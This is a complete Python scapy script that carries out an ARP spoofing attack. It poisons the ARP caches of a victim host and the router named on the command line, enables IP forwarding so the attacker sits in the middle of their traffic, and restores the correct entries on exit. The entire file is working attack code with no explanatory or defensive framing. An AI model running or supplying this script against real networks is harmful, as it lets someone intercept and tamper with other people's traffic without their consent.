import scapy.all as scapy
import sys
import re as regex
import time
import subprocess
import os

def get_mac_from_ip(target_ip):
	answered, unanswered = scapy.srp(scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = target_ip), timeout = 1, verbose = False)
	return (answered[0])[1].hwsrc

print("\n\n---- Starting the ARP Spoof ----")
victim_ip = sys.argv[1]
router_ip = sys.argv[2]
victim_mac = get_mac_from_ip(victim_ip)
print("[+] Obtained the MAC address of the victim")

victim_packet = scapy.ARP(op = 2, pdst = victim_ip, hwdst = get_mac_from_ip(victim_ip), psrc = router_ip)
router_packet = scapy.ARP(op = 2, pdst = router_ip, hwdst = get_mac_from_ip(router_ip), psrc = victim_ip)

FNULL = open(os.devnull, "w")
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout = FNULL, shell = True)
print("[+] Enabled IP forwarding")

try:
	print("[+] Starting to send ARP poisoned packets. To stop, hit CTRL + C")
	packets_sent = 0
	while True:
		scapy.send(victim_packet, verbose = False)
		scapy.send(router_packet, verbose = False)
		packets_sent += 2
		print("\rARP poisoned packets sent: " + str(packets_sent), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[+] Stopped sending packets.")
	
	restore_router = scapy.ARP(op = 2, pdst = router_ip, hwdst = get_mac_from_ip(router_ip), psrc = victim_ip, hwsrc = get_mac_from_ip(victim_ip))
	restore_victim = scapy.ARP(op = 2, pdst = victim_ip, hwdst = get_mac_from_ip(victim_ip), psrc = router_ip, hwsrc = get_mac_from_ip(router_ip))
	
	scapy.send(restore_router, verbose = False)
	scapy.send(restore_victim, verbose = False)
	print("[+] Restored the victim's and router's correct settings")
	
	print("[+] Disabling IP forwarding and exiting the program..")
	subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", stdout = FNULL, shell = True)
	FNULL.close()
	sys.exit(0)
